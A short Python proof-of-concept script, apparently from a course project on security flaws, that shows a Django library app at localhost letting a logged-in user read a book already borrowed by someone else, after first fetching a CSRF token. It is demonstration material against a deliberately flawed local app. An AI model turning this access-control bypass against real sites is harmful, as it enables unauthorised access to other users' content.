#THIS PROGRAM SHOWS FLAW 2 WHEN FLAW 1 HAS BEEN FIXED
#FLAW 1 FIXES CSRF
#FLAW 2 ACCESSES AN ALREADY BORROWED BOOK
#TO USE:
#make sure Book1 is borrowed
#run this program and read the output
#you should find the HTML code of the page, including the text of Book1
#this means you can access an already borrowed book
#ONCE FLAW 2 IS FIXED
#you can try this program again if you have plenty of time

#code is borrowed from https://stackoverflow.com/a/13569789

import sys
import requests

URL = 'http://localhost:8000/library/readbook/Book1' #this is what we will try to access

client = requests.session()

# Retrieve the CSRF token first
client.get("http://localhost:8000/library")  # sets cookie
if 'csrftoken' in client.cookies:
    # Django 1.6 and up
    csrftoken = client.cookies['csrftoken']
else:
    # older versions
    csrftoken = client.cookies['csrf']

login_data = dict(username="EMAIL", password="PASSWORD", csrfmiddlewaretoken=csrftoken, next='/')
r = client.post(URL, data=login_data, headers=dict(Referer=URL))
print(r.text) #print the HTML of the page (i.e. book)
